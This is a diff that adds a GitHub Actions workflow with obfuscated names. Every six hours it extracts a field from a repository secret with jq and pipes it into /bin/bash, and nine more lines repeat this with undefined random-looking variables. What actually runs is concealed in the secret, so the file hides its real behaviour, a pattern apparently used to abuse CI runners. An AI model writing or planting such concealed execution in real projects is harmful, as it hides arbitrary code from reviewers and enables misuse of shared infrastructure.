@@ -1,0 +1,26 @@
+name: meinenglimx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: meinenglimx
+        env:
+          vc1: ${{ secrets.vc1 }}
+        run: |
+          echo $vc1 | jq -r .z7 | /bin/bash
+          echo $mfz72378 | jq -r .r6734 | /bin/bash
+          echo $j91 | jq -r .gf020 | /bin/bash
+          echo $w669 | jq -r .rlr50767 | /bin/bash
+          echo $wx01 | jq -r .y1 | /bin/bash
+          echo $wdsz6 | jq -r .oiflt79 | /bin/bash
+          echo $mgoj4 | jq -r .zunek3903 | /bin/bash
+          echo $unute4 | jq -r .h2 | /bin/bash
+          echo $qcbb78034 | jq -r .dvt50 | /bin/bash
+          echo $rwab203 | jq -r .xmacu0469 | /bin/bash
+
